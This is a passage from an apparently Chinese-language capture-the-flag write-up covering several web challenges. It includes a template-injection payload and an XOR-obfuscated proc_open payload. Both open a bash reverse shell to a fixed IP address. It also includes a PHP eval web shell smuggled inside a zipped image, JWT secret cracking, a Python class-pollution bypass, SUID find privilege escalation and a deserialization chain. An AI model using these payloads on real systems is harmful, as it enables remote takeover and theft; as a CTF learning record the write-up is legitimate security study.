class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;view options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;escapeFunction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.108.89.135/2333 0&gt;&amp;1\&quot;&#x27;);&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;client&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;true&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>监听2333端口，打入payload，成功拿到shell</p><p> SYC{Chun_a1_M4n_NeVer_G1ve_Up}</p><h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>打开提示说“压缩”，试着上传一个zip文件，发现上传成功，第一反映是zip伪协议读文件，就找找有无文件包含的地方，查看源码，发现&#x2F;include.php进入发现是include文件包含。</p><p>上传的压缩包：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">名字是：<span class="hljs-number">123</span>.zip<br>内容是：<span class="hljs-number">123</span>.jpg<br>jpg内容是：<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;123&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在&#x2F;include.php传入</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-symbol">zip:</span>/<span class="hljs-regexp">/upload/</span><span class="hljs-number">123</span>.zip<span class="hljs-comment">#123.jpg</span><br></code></pre></td></tr></table></figure><p>然后就可以任意命令执行了</p><p>SYC{bobegCk7ysmNOMI8z2}</p><h2 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h2><p>经典登录，发现源码里有帐号密码，登录之后发现有文件上传，但是告诉我们只有admin才能上传文件，我们复制cookie，但是需要找到密钥，一顿好找之后发现根本找不到，就去github上找到了一个密钥爆破脚本，下载下来后爆破密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it --<span class="hljs-built_in">rm</span>  jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4<br></code></pre></td></tr></table></figure><p>爆破出来密钥是：yibao</p><p>更换cookie后能上传文件，这道题可以直接上传php，但是我们的文件名被更换过一次，经过审计，发现是php伪随机数，随机数种子是当前时间截，我们只要掐好上传当时的时间截，把代码复制到本地跑一遍，就能拿到文件名了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$seed</span></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$seed</span>);<br> &#125;<br> <span class="hljs-variable">$seed</span> = <span class="hljs-number">1700298188</span>;<br> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-variable">$seed</span>);<br> <span class="hljs-variable">$characters</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br><br> <span class="hljs-variable">$newFileName</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br> <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$newFileName</span> .= <span class="hljs-variable">$characters</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$characters</span>) - <span class="hljs-number">1</span>)];<br> &#125;<br><br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$newFileName</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>文件名：TjjLzWMp9K.php</p><p>进入&#x2F;upload&#x2F;TjjLzWMp9K.php，成功命令执行。</p><p>SYC{fsfikgocwq4rsqmad5}</p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>发现有注册页面，随便注册一个，登录，看附件里的源码，发现&#x2F;flag网址，进去提示我们不是vip，审计源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.username=<span class="hljs-string">&quot;&quot;</span><br>        self.password=<span class="hljs-string">&quot;&quot;</span><br>        self.isvip=<span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>user这个类里isvip默认是false，而在注册界面，发现有merge(data,user)</p><p>存在原型链污染，根据python的结构，我们在注册时post的json数据应该是这样的：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__class__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <br>        <span class="hljs-attr">&quot;__base__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;isvip&quot;</span> <span class="hljs-punctuation">:</span><span class="hljs-string">&quot; True&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>但是显示被过滤了，经过测试，发现过滤了isvip，那么尝试unicode编码绕过：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;q&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;__class__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <br>        <span class="hljs-attr">&quot;__base__&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;\u0069\u0073\u0076\u0069\u0070&quot;</span> <span class="hljs-punctuation">:</span><span class="hljs-string">&quot; True&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>注册成功！然后登录进去，进入&#x2F;flag界面，提示我们传入一个num：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">and</span> data != <span class="hljs-string">&quot;123456789&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(data) == <span class="hljs-number">123456789</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data) &lt;=<span class="hljs-number">10</span>:<br></code></pre></td></tr></table></figure><p>传入的num满足以上条件，即可拿到flag，尝试在123456789前后加各种字符，发现均不行，最后发现空格和tab能成功进入，于是传入num&#x3D;%20123456789或者num&#x3D;%09123456789均可。</p><p>SYC{WaefaxJoYLKnVyQQhO}</p><h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><p>绕过waf.php命令执行，经过测试，发现只能用异或payload，先看看phpinfo：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?data<span class="hljs-operator">=</span>(<span class="hljs-variable">%8</span>f<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%96</span><span class="hljs-variable">%91</span><span class="hljs-variable">%99</span><span class="hljs-variable">%90</span>^<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>发现ban了绝大多数命令执行函数：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">fwrite</span>,passthru,<span class="hljs-keyword">popen</span>,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders<br></code></pre></td></tr></table></figure><p>但还剩一个proc_open。</p><p>根据php手册的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;ipconfig&quot;</span>;  <br><span class="hljs-variable">$array</span> =   <span class="hljs-keyword">array</span>(  <br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>),   <span class="hljs-comment">//标准输入 </span><br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),   <span class="hljs-comment">//标准输出内容 </span><br>  <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>)    <span class="hljs-comment">//标准输出错误 </span><br>);  <br><br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-variable">$test</span>,<span class="hljs-variable">$array</span>,<span class="hljs-variable">$pipes</span>);   <span class="hljs-comment">//打开一个进程通道 </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">stream_get_contents</span>(<span class="hljs-variable">$pipes</span>[<span class="hljs-number">1</span>]);    <span class="hljs-comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span><br><span class="hljs-title function_ invoke__">proc_close</span>(<span class="hljs-variable">$fp</span>);  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们需要构造的payload为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proc_open</span>(<span class="hljs-string">&quot;bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/<span class="hljs-number">47.108.89.135</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&quot;</span>,$array,$pipes);<br><span class="hljs-attribute">print_r</span>(stream_get_contents($pipes[<span class="hljs-number">1</span>]));<br></code></pre></td></tr></table></figure><p>经过变量替换：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-variable">$a</span>[]=<span class="hljs-string">&quot;pipe&quot;</span>;<span class="hljs-variable">$a</span>[]=<span class="hljs-string">&quot;r&quot;</span>;<span class="hljs-variable">$aa</span>[]=<span class="hljs-string">&quot;pipe&quot;</span>;<span class="hljs-variable">$aa</span>[]=<span class="hljs-string">&quot;w&quot;</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$a</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$aa</span>;<span class="hljs-variable">$aaa</span>[]=<span class="hljs-variable">$aa</span>;<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;bash -c &quot;</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/tcp</span><span class="hljs-regexp">/47.108.89.135/</span><span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><span class="hljs-string">&quot;&quot;</span>;<span class="hljs-variable">$__</span>=proc_open(<span class="hljs-variable">$_</span>,<span class="hljs-variable">$aaa</span>,<span class="hljs-variable">$___</span>);print_r(stream_get_contents(<span class="hljs-variable">$___</span>[<span class="hljs-number">1</span>]));<br></code></pre></td></tr></table></figure><p>经过异或操作：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?data=$a[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$a[]=(%8d^%ff);$aa[]=(%8f%96%8f%9a^%ff%ff%ff%ff);$aa[]=(%88^%ff);$aaa[]=$a;$aaa[]=$aa;$aaa[]=$aa;$_=(%9d%9e%8c%97%df%d2%9c%df%dd%9d%9e%8c%97%df%d2%96%df%c1%d9%df%d0%9b%9a%89%d0%8b%9c%8f%d0%cb%c8%d1%ce%cf%c7%d1%c7%c6%d1%ce%cc%ca%d0%cd%cc%cc%cc%df%cf%c1%d9%ce%dd^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff);$__=(%8f%8d%90%9c%a0%90%8f%9a%91^%ff%ff%ff%ff%ff%ff%ff%ff%ff)($_,$aaa,$___);(%8f%8d%96%91%8b%a0%8d^%ff%ff%ff%ff%ff%ff%ff)((%8c%8b%8d%9a%9e%92%a0%98%9a%8b%a0%9c%90%91%8b%9a%91%8b%8c^%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff)($___[(%ce^%ff)]));<br></code></pre></td></tr></table></figure><p>我们打入payload进行反弹shell，但是当我们cat &#x2F;flag 的时候提示我们Permission denied没有权限，就要进行提权。<a href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p><p>利用命令查找系统上运行的所有SUID可执行文件。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/bin/mount<br><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chsh</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/find</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/gpasswd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br></code></pre></td></tr></table></figure><p>我们进行find提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \;<br></code></pre></td></tr></table></figure><p>拿到flag</p><p>SYC{ThE_RCe is S0 Eas1ly_DD!}</p><h2 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h2><p>又臭又长的反序列化。</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>刚开始就来了个下马威：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$user</span>)) &#123;<br></code></pre></td></tr></table></figure><p>不能以Oa开头，假如不ban掉a的话，我们可以在a数组里面放上我们的恶意对象，也可以反序列化，但是ArrayObject，（此方法只在php版本8.0以下适用）他是C开头的，并且可以绕过O，然后还可以带属性反序列化，符合条件，因此可以构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>整段代码可以分为两部分，第一部分是做题部分，但是需要密钥，第二部分是拿取密钥部分，这里有很多小知识点。</p><p>在useless类中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;QW))&lt;<span class="hljs-number">80</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;YXX)&lt;<span class="hljs-number">80</span>)&#123;<br>                <span class="hljs-variable">$bool</span>=!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;QW)&amp;&amp;!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;QW) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="hljs-variable language_">$this</span>-&gt;QW != <span class="hljs-variable language_">$this</span>-&gt;YXX) <span class="hljs-keyword">and</span> <span class="hljs-variable">$random</span>===<span class="hljs-string">&#x27;newbee&#x27;</span>;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$bool</span>)&#123;<br></code></pre></td></tr></table></figure><p>我们需要传入QW和YXX的值，让他俩值不相等，但是MD5加密相等，这种MD5加密强比较，第一反应应该是数组绕过，但是这里把数组ban了，第二反应是碰撞，但是找遍全网也找不到80个字符以下的两个md5相等的字符串，查询资料，发现还有第三种方法：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-literal">NAN</span>代表非数值的特殊值，用于指示某个值不是数字<br><span class="hljs-literal">NAN</span>与其他数值进行比较的结果总是不相等的，包括自身在内<br></code></pre></td></tr></table></figure><p>所以将QW和YXX均赋值为NAN即可绕过。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">关于这个的问题and <span class="hljs-symbol">$ra</span>ndom===<span class="hljs-string">&#x27;newbee&#x27;</span>;<br></code></pre></td></tr></table></figure><p>这里是一个随机数字，但是要等于一个字符串，显然不可能，其实这里不用管，因为赋值符号‘&#x3D;’的优先级大于and，所以他会被忽略。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]: <span class="hljs-string">&quot;&quot;</span> ;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/HTTP/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$a</span>]));<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-variable">$a</span>])===<span class="hljs-string">&#x27;key.php&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;key.php&quot;</span>;<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>然后我们需要传入一个a，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">案例网址：https:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] 得到：<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br></code></pre></td></tr></table></figure><p>$_SERVER[‘REQUEST_URI’]又不能存在key.php，所以我们传入a&#x3D;PHP_SELF</p><p>然后在当前的url网址后面加上&#x2F;key.php即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php<br>改为<br>https://e3kdaoip15ici39mafpbux8qb.node.game.sycsec.com/havefun.php/key.php<br></code></pre></td></tr></table></figure><p>最终的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">useless</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$seeyou</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=NAN;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$YXX</span>=NAN;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">useless</span>();<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayIterator</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//e<span class="hljs-number">3</span>kdaoip<span class="hljs-number">15</span>ici<span class="hljs-number">39</span>mafpbux<span class="hljs-number">8</span>qb.node.game.sycsec.com/havefun.php/key.php?user<span class="hljs-operator">=</span>C<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>ArrayIterator<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">89</span><span class="hljs-variable">%3</span>A&#123;<span class="hljs-keyword">x</span><span class="hljs-variable">%3</span>Ai<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>useless<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A&#123;s<span class="hljs-variable">%3</span>A<span class="hljs-number">15</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>useless<span class="hljs-variable">%00</span>seeyou<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>QW<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bd<span class="hljs-variable">%3</span>ANAN<span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>YXX<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bd<span class="hljs-variable">%3</span>ANAN<span class="hljs-variable">%3</span>B&#125;<span class="hljs-variable">%3</span>Bm<span class="hljs-variable">%3</span>Aa<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A&#123;&#125;&#125;&amp;a<span class="hljs-operator">=</span>PHP_SELF<br></code></pre></td></tr></table></figure><p>拿到了一大串base64加密后的东西，拿去解密之后发现是图片，查看图片找到密钥</p><p>key&#x3D;9</p><p>hername&#x3D;momo</p><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>分析pop链，在her 类中，找到我们的终点：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span 